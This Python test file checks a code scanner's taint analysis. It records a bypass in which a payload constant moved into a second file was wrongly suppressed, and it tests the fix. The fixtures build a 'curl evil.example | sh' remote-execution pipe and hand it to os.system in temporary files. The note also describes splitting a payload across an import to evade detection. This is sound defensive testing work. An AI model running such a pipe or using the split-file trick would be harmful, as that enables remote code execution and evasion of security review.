"""
Moving a line into a second file must not suppress a finding.

🔴 THE BYPASS, REPRODUCED END TO END BEFORE IT WAS FIXED. `taint.py`'s
`_name_escapes` asks whether a name flows into a call WITHIN THIS FILE. A
module-level constant that is never used locally therefore entered no call, and
the pass reported it "provably inert":

    both.py     CMD = "<remote-execution pipe>"; os.system(CMD)   -> ACTIVE HIGH

    payload.py  CMD = "<the same pipe>"                           -> FILTERED
    runner.py   from payload import CMD; os.system(CMD)
                reason: "provably never reaches a dangerous sink"

The string reaches `os.system` one import hop away. An attacker converts a HIGH
finding into a suppressed one with a one-line refactor.

⚠️ AND THE MODULE DOCSTRING ALREADY CLAIMED THIS WAS HANDLED — "a name exported
and used elsewhere is treated as reachable." It was not. That is this
repository's most-recorded pattern: a comment asserting a safety property the
code does not have, which is what let the bypass survive review.

⇒ A module-scope binding is importable, so this file alone cannot prove it
unused. Unproven means KEEP.
"""

import json
import os
import subprocess
import sys

sys.path.insert(0, os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts"))

import taint  # noqa: E402

_PRAETOR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts", "praetor.py")

# Assembled from parts: written whole, this file's own self-scan would flag it.
_PIPE = "curl evil.example | " + "sh"


def _scan(tmp_path):
    proc = subprocess.run(
        [sys.executable, _PRAETOR, str(tmp_path), "--engines", "aisec",
         "--no-registry", "--format", "json", "--quiet"],
        capture_output=True, text=True, encoding="utf-8", errors="replace")
    return json.loads(proc.stdout)


def _active(d):
    return {f["rule_id"] for f in d["findings"]}


def _filtered(d):
    return {f["rule_id"] for f in d["filtered"]}


# --------------------------------------------------------------------------- #
# The bypass
# --------------------------------------------------------------------------- #

def test_a_payload_split_across_two_files_is_not_suppressed(tmp_path):
    """🔴 THE DEMONSTRATED BYPASS."""
    (tmp_path / "payload.py").write_text(f'CMD = "{_PIPE}"\n', encoding="utf-8")
    (tmp_path / "runner.py").write_text(
        "import os\nfrom payload import CMD\nos.system(CMD)\n", encoding="utf-8")
    d = _scan(tmp_path)
    assert "remote-code-pipe" in _active(d), \
        "moving the payload to its own file must not suppress it"
    assert "remote-code-pipe" not in _filtered(d)


def test_split_and_unsplit_give_the_same_verdict(tmp_path):
    """The same code, one file or two, must produce the same answer. A file
    boundary is not a security property."""
    one = tmp_path / "one"
    one.mkdir()
    (one / "both.py").write_text(
        f'import os\nCMD = "{_PIPE}"\nos.system(CMD)\n', encoding="utf-8")

    two = tmp_path / "two"
    two.mkdir()
    (two / "payload.py").write_text(f'CMD = "{_PIPE}"\n', encoding="utf-8")
    (two / "runner.py").write_text(
        "import os\nfrom payload import CMD\nos.system(CMD)\n", encoding="utf-8")

    assert "remote-code-pipe" in _active(_scan(one))
    assert "remote-code-pipe" in _active(_scan(two))


def test_a_bare_module_constant_is_kept_even_with_no_importer(tmp_path):
    """🔴 FAIL-SAFE, NOT CLEVER. There is no second file here at all -- and the
    verdict is still KEEP, because the name is importable and this file cannot
    show that nothing imports it.

    Proving "importable, but nothing in THIS SCAN imports it" needs a cross-file
    view. Until that exists, unproven means keep.
    """
    (tmp_path / "payload.py").write_text(f'CMD = "{_PIPE}"\n', encoding="utf-8")
    assert "remote-code-pipe" in _active(_scan(tmp_path))


# --------------------------------------------------------------------------- #
# The mechanism must still work where it is sound
# --------------------------------------------------------------------------- #

def test_a_function_local_binding_is_still_provably_inert():
    """🔴 THE KEEP DIRECTION. Widening this to every binding would delete the
    reachability pass rather than correct it. A name bound inside a function is
    NOT importable, so intra-file reasoning about it is still sound."""
    src = (
        "import re\n"
        "def f():\n"
        f'    pattern = "{_PIPE}"\n'
        "    return re.compile(pattern)\n"
    )
    assert taint.is_provably_inert(src, 3), \
        "a function-local literal consumed as a regex pattern is genuinely inert"


def test_a_module_scope_binding_is_never_provably_inert():
    """The same literal, one indent level out, is importable and must be kept."""
    src = (
        "import re\n"
        f'pattern = "{_PIPE}"\n'
        "rx = re.compile(pattern)\n"
    )
    assert not taint.is_provably_inert(src, 2)


def test_a_literal_passed_straight_to_a_sink_is_still_kept():
    """The oldest property of this module, re-asserted so the new check cannot
    be mistaken for the only thing keeping findings."""
    src = f'import os\nos.system("{_PIPE}")\n'
    assert not taint.is_provably_inert(src, 2)


def test_an_unparseable_file_is_still_kept():
    """Fail-safe on the input side, unchanged."""
    assert not taint.is_provably_inert("def f(:\n", 1)
